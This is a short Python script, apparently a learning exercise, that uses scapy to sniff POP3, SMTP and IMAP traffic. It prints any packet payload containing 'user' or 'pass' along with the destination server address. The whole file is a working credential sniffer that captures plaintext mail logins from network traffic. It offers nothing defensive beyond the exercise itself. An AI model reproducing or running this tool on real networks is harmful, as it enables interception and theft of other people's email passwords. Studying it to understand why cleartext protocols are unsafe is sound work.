#sniff(filter="",iface="any",prn=function,count=N)

#from scapy.all import*
# our packet callback
#def packet_callback(packet):
 #print (packet).show()

# fire up our sniffer
#sniff(prn=packet_callback,count=1)

from scapy.all import sniff,TCP,IP

# our packet callback
def packet_callback(packet):
 
     if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
         print (f"[*] Server: {packet[IP].dst}")
         print (f"[*] {str(packet[TCP].payload)}")
# fire up our sniffer
def main():
   sniff(filter="tcp port 110 or tcp port 25 or tcp port 143",prn=packet_callback,store=0)

if  __name__ == "__main__":
   main()

